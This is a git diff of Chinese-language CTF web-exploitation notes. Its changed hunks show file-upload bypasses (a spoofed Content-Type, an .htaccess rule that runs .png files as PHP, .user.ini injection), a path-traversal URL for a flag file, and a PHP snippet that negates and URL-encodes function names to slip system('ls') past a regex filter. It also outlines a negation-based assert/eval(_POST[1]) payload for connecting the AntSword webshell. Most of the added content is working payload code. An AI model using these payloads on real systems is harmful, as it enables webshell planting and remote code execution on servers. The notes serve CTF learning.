@@ -418,7 +418,7 @@ chr() 也是Python的内置函数，用于返回指定Unicode编码的字符。�
 
 ###### test.php
 
-- 有的题需要修改 Content-Type 为 image/jpg 绕过，如果不行，则改成 image/jpeg
+- 有的题需要修改 Content-Type 为 image/jpg 绕过，如果不行，则改成 **image/jpeg**
 
 1.编辑 PHP 文件内容:
 
@@ -444,6 +444,8 @@ chr() 也是Python的内置函数，用于返回指定Unicode编码的字符。�
 ```
 ###### .htaccess 防止绕过 php
 
+- 该方法旨在指定图片文件为可执行的 php 文件
+
 如果服务端禁止上传 php，可以将 php 改为图片格式 (如 png) 欺骗服务器，再使用 .htaccess 将 png 指定为 php 文件执行。(需要注意下，传图片需要确保 HTTP Headers 的 content-type 为 image/jpeg，目前知道 .htaccess 支持 Nginx 和 Apache)
 
 .htaccess 文件内容
@@ -454,9 +456,11 @@ SetHandler application/x-httpd-php
 </FilesMatch>
 ```
 
-然后访问上传的 php 文件即可
+然后访问上传的 php 文件（xin.png）即可
 
  ###### 更进一步的 .user.ini 绕过
+
+- 该方法旨在向已有的 php 文件注入攻击代码
 
 首先上传 .user.ini 文件（配合 Burp 的 Reapter，把 Content-Type: application/octet-stream 修改为 Content-Type: image/jpg）
 
@@ -649,7 +653,7 @@ http://xxx/?url=file:///var/www/html/flag.php
 http://xxx/source.php?file=hint.php?../../../../../ffffllllaaaagggg
 ```
 
-#### 绕过复杂的正则表达式
+#### 绕过复杂的正则表达式（RCE 类型之一）
 
 > 查看 flag.php 的一种冷门方法
 
@@ -659,7 +663,48 @@ http://xxx/?p=uniq${IFS}f???.php
 
 > 如 preg_match("/[A-Za-z0-9]+/",$code)
 
+##### 取反通用方法
+
+如需执行 `eval($code);`
+
+首先对 system 取反
+
+```php
+<?php
+$a="system";
+echo "~" . urlencode(~$a) . "\n";
+?>
+```
+
+得到
+
+```
+~%8C%86%8C%8B%9A%92
+```
+
+再对 ls 取反
+
+```php
+<?php
+$a="ls";
+echo "~" . urlencode(~$a) . "\n";
+?>
+```
+
+得到
+
+```
+~%93%8C
+```
+
+构造 system('ls'); 如下
+
+```
+?code=(~%8C%86%8C%8B%9A%92)(~%93%8C);
+```
+
 ##### 取反执行某个函数
+
 取反后 得到不可读的打印串，再将 url 编码
 ```php
 <?php
@@ -676,11 +721,9 @@ echo $d;
 (~%8F%97%8F%96%91%99%90)();
 ```
 
-
-
 ##### 取反连接蚁剑
 
-> 通过构建 assert（eval(_POST['test'])）来使蚁剑连接
+> 通过构建 assert（eval(_POST[1])）来使蚁剑连接
 
 ```php
 <?php
